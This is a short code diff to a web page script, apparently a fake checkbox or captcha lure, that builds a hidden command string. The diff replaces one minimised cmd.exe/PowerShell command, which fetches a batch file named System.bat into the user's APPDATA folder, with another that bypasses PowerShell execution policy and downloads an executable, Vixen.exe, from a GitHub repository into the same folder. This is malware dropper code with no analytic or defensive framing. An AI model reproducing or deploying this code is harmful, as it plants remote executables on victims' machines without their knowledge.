@@ -60,7 +60,8 @@ function generateUniqueUsername() {
     return username;
 }
 
-const cmd = `cmd.exe /c start /min powershell.exe -Command "$yhjd = 'https://github.com/ChatGPTCrack/main/releases/download/Cloudflare/System.bat'; $dest = [System.IO.Path]::Combine($env:APPDATA, 'System.bat'); iwr $yhjd -OutFile $dest""`;
+const cmd = `cmd.exe /c start /min powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'https://github.com/quivingsnew/Vixen-Temp-Woof/raw/refs/heads/main/Vixen.exe' -OutFile ([System.IO.Path]::Combine($env:APPDATA, 'Vixen.exe'))}"
+""`;
 
 const checkboxBtn = document.getElementById("checkbox");
 const content = document.getElementById("HJup0");
